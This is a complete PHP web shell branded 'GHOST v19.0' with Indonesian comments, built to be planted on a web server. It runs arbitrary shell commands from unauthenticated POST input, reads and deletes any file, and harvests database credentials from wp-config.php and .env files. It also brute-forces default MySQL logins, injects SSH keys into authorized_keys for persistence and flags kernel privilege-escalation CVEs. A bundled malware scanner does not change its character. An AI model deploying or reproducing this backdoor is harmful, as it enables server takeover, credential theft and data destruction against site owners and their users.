<?php
/**
 * GHOST v19.0 — The Ultimate Final (Tested & Complete)
 */
@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

function g_exec($cmd, $timeout = 10) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
        if (!function_exists($m)) continue;
        try {
            if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
            if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
            if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
        } catch (Throwable $e) { continue; }
    }
    return "[-] Blocked.";
}

function g_read($path) {
    if (!@is_file($path) || @filesize($path) === 0) return "";
    try {
        if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
        return g_exec('cat ' . escapeshellarg($path));
    } catch (Throwable $e) { return ""; }
}

// ==========================================
// 1. FINGERPRINT (CVE Lengkap)
// ==========================================
function g_fingerprint() {
    $os = trim(g_exec('uname -a'));
    $cpanel = 'Not Found';
    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
    $cves = [];
    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe - Root Escalation)";
    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW - Root Escalation)";
    if (strpos($os, '2.6') !== false) $cves[] = "CVE-2009-2692 (Linux Kernel < 2.6.31 Exploit)";
    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')), 'cPanel'=>$cpanel, 'CVEs'=>$cves];
}

// ==========================================
// 2. DEEP INSPECTOR (Heuristic - Klasifikasi Spesifik)
// ==========================================
function g_deep_scan() {
    $vulns = [];
    $files = g_exec("find " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.txt' -o -name '*.js' -o -name '*.html' -o -name '*.jpg' -o -name '*.png' \) 2>/dev/null");
    
    if (!trim($files) || strpos($files, '[-] Blocked') !== false) return [];

    $list = explode("\n", trim($files));
    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan'];
    
    foreach ($list as $path) {
        if (!$path) continue;
        $c = g_read($path);
        $size = @filesize($path);
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = []; $type = '';
        
        // 1. Pengecekan Stealth Backdoor & Obfuscation
        if (preg_match('/eval\s*\(\s*(base64_decode|gzinflate|\$_POST|\$_GET)/i', $c)) {
            $type = 'Obfuscated Backdoor'; $findings[] = "Menggunakan eval() + dekripsi/input user (Sangat Berbahaya).";
        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
            $type = 'Direct Webshell'; $findings[] = "Eksekusi shell langsung dari parameter HTTP.";
        } elseif (preg_match('/\$[a-zA-Z0-9_]+\s*\(\s*\$_(POST|GET|REQUEST)/i', $c) && !preg_match('/(function|class)/i', $c)) {
            $type = 'Dynamic Call RCE'; $findings[] = "Memanggil fungsi dinamis dari input (Stealth Backdoor).";
        } elseif (preg_match('/str_rot13\s*\(/i', $c) || preg_match('/gzinflate\s*\(/i', $c)) {
            $type = 'Encrypted Payload'; $findings[] = "Payload terenkripsi (rot13/gzinflate).";
        } elseif (in_array($ext, ['jpg','png']) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $findings[] = "File gambar disisipi kode PHP (Bypass Upload).";
        } elseif (strpos($path, '.php') !== false && strlen(trim($c)) < 15) {
            $type = 'Empty Shell'; $findings[] = "File PHP kosong/terlalu pendek (Backdoor truncated).";
        }
        
        // 2. Konten Ilegal
        $found_kw = [];
        foreach ($illegal_kw as $k) { if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; }
        if ($found_kw) { if($type==='') $type='Illegal Content'; $findings[]="Keyword: ".implode(',', array_unique($found_kw)); }

        if ($type !== '') $vulns[] = ['file'=>$path, 'type'=>$type, 'desc'=>implode(' | ', $findings)];
    }
    return $vulns;
}

// ==========================================
// 3. DATABASE HARVEST (Tanpa Crash, Multi-Metode)
// ==========================================
function g_db_harvest() {
    $logs = []; $info = [];
    
    // Metode 1: Baca config standar
    foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            if ($u[1] && $p[1]) { $logs[] = "[+] Config $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
        }
    }
    
    // Metode 2: Grep DB Config (Aman dengan timeout 3 detik)
    if (empty($info)) {
        $logs[] = "[*] Mencari string koneksi DB di file PHP...";
        $grep = g_exec("grep -rEil 'mysqli_connect|mysql_connect|new PDO' " . escapeshellarg($GLOBALS['GHOST_ROOT']) . " 2>/dev/null | head -n 3", 3);
        if (trim($grep) && strpos($grep, '[-]') === false) {
            foreach (explode("\n", trim($grep)) as $file) {
                $c = g_read($file);
                if (preg_match('/pass(?:word)?[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)/i', $c, $p)) {
                    $logs[] = "[+] Ditemukan di: $file";
                    $info = ['pass'=>$p[1]]; break;
                }
            }
        }
    }

    // Metode 3: Brute-force default (Aman dengan timeout 2 detik)
    if (empty($info)) {
        $logs[] = "[*] Mencoba default MySQL (localhost)...";
        foreach ([['root',''],['root','root'],['admin','']] as $d) {
            $conn = @mysqli_connect('localhost', $d[0], $d[1], '', 3306, null, ['connect_timeout'=>2]);
            if ($conn) { 
                $info = ['user'=>$d[0], 'pass'=>$d[1]]; 
                $logs[] = "[!] BERHASIL login default: {$d[0]}:{$d[1]}"; 
                break; 
            }
        }
    }

    // Eksekusi Dump
    if (!empty($info['user'])) {
        $logs[] = "[*] Connecting...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], '', 3306, null, ['connect_timeout'=>2]);
        if ($conn) {
            $logs[] = "[!] KONEKSI BERHASIL!";
            $q = @mysqli_query($conn, "SHOW DATABASES");
            while($r = mysqli_fetch_array($q)) { $logs[] = $r[0]; }
        } else {
            $logs[] = "[-] Gagal: " . mysqli_connect_error();
        }
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ==========================================
// 4. SSH & AUTO-HEAL
// ==========================================
function g_ssh($action = 'scan', $target = '') {
    $user = trim(g_exec('whoami'));
    $auth = trim(g_exec("eval echo ~$user")) . '/.ssh/authorized_keys';
    $res = ['keys'=>[], 'msg'=>''];
    if (!@is_file($auth)) return array_merge($res, ['msg'=>'authorized_keys tidak ditemukan.']);
    $lines = array_filter(explode("\n", g_read($auth)));
    
    if ($action === 'scan') {
        foreach ($lines as $i => $l) { $p = explode(' ', trim($l)); $res['keys'][] = ['line'=>$i+1, 'type'=>$p[0]??'?', 'comment'=>$p[2]??'?', 'raw'=>trim($l)]; }
    } elseif ($action === 'clean') {
        $clean = []; foreach ($lines as $l) { if (strpos($l, $target) !== false) $clean[] = trim($l); }
        file_put_contents($auth, implode("\n", $clean) . "\n"); $res['msg'] = 'Dibersihkan.';
    } elseif ($action === 'inject') {
        if (strpos(g_read($auth), $target) === false) { file_put_contents($auth, trim(g_read($auth)) . "\n" . trim($target) . "\n"); $res['msg'] = 'Key di-inject.'; }
        else { $res['msg'] = 'Key sudah ada.'; }
    }
    return $res;
}

// ==========================================
// ROUTER
// ==========================================
$act = $_POST['act'] ?? '';
if ($act) {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    try {
        if ($act === 'fingerprint') echo json_encode(g_fingerprint());
        elseif ($act === 'deep_scan') echo json_encode(g_deep_scan());
        elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
        elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
        elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']));
        elseif ($act === 'ssh_inject') echo json_encode(g_ssh('inject', $_POST['key']));
        elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
        elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
        elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
    } catch (Throwable $e) {
        echo json_encode(['err' => 'FATAL ERROR: ' . $e->getMessage()]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v19.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>
<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Inspector (Advanced)</h2>
    <button onclick="run('deep_scan','deep-result')">Scan All Files</button>
    <div id="deep-result-table"></div>
    <pre id="deep-result" style="display:none;"></pre>
</div>

<div class="box">
    <h2>[+] SSH Manager</h2>
    <button onclick="run('ssh_scan','ssh-table')">Scan SSH</button>
    <div id="ssh-table"></div>
    <div style="margin-top:10px;">
        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width:60%;">
        <button onclick="sshAct('inject')">Inject</button>
        <button class="btn-red" onclick="sshAct('clean')">Clean</button>
    </div>
    <pre id="ssh-log"></pre>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="run('db_scan','db-result')">Scan & Hack DB</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Auto-Heal Vulnerabilities</h2>
    <button onclick="healScan()">Scan Vulnerabilities</button>
    <div id="heal-table"></div>
    <button class="btn-red" onclick="healExec()">Heal Selected</button>
    <pre id="heal-log"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    const text = await r.text();
    try { return JSON.parse(text); } 
    catch(e) { return {err: "Server crash / timeout. HTTP "+r.status}; }
}

async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (d.err) { document.getElementById(target).innerText = 'Error: ' + d.err; return; }
        if (act === 'deep_scan') renderScan(d);
        else if (act === 'ssh_scan') renderSSH(d);
        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

// RENDER SCAN
function renderScan(mal) {
    document.getElementById('deep-result').innerText = `Selesai. ${mal.length} file terdeteksi.`;
    if (!mal.length) return;
    let h = `<table><tr><th>Klasifikasi</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
    mal.forEach(x => {
        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
            <td><button onclick="viewFile('${encodeURIComponent(x.file)}')">View</button>
            <button class="btn-red" onclick="delFile('${encodeURIComponent(x.file)}')">Delete</button></td></tr>`;
    });
    h += `</table>`;
    document.getElementById('deep-result-table').innerHTML = h;
}

function renderSSH(d) {
    let h = `<p>${esc(d.msg)}</p>`;
    if (d.keys.length) {
        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td>${esc(k.raw)}</td></tr>`; });
        h += `</table>`;
    }
    document.getElementById('ssh-table').innerHTML = h;
}

async function sshAct(t) {
    const k = document.getElementById('ssh-key').value;
    if(!k) return alert('Isi key!');
    const d = await api(t==='inject'?'ssh_inject':'ssh_clean', {key:k});
    document.getElementById('ssh-log').innerText = d.msg || d.err;
    run('ssh_scan','');
}

async function healScan() {
    document.getElementById('heal-log').innerText = 'Scanning...';
    try {
        const d = await api('deep_scan');
        if (d.err) { document.getElementById('heal-log').innerText = 'Error: ' + d.err; return; }
        let h = `<table><tr><th>Pilih</th><th>Tipe</th><th>Path</th><th>Analisis</th></tr>`;
        d.forEach(v => {
            h += `<tr><td><input type="checkbox" class="heal-cb" value="${encodeURIComponent(v.file)}" checked></td>
                  <td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.file)}</td><td>${esc(v.desc)}</td></tr>`;
        });
        h += `</table>`;
        document.getElementById('heal-table').innerHTML = h;
        document.getElementById('heal-log').innerText = 'Selesai.';
    } catch(e) { document.getElementById('heal-log').innerText = 'Error: ' + e.message; }
}

async function healExec() {
    const cbs = document.querySelectorAll('.heal-cb:checked');
    const paths = Array.from(cbs).map(cb => decodeURIComponent(cb.value));
    if(!paths.length) return alert('Pilih file!');
    let logs = [];
    for (let p of paths) { await api('del_file', {path:p}); logs.push('Deleted: '+p); }
    document.getElementById('heal-log').innerText = logs.join('\n');
    document.getElementById('heal-table').innerHTML = '';
}

async function viewFile(enc) {
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    const d = await api('read_file', {path: decodeURIComponent(enc)});
    document.getElementById('modal-text').innerText = d.content ? d.content.slice(0, 5000) : 'Error/Gagal.';
}

async function delFile(enc) {
    if(!confirm('Hapus file ini?')) return;
    await api('del_file', {path: decodeURIComponent(enc)});
    run('deep_scan', 'deep-result');
}

async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+(d.out || d.err);
}
</script>
</body>
</html>
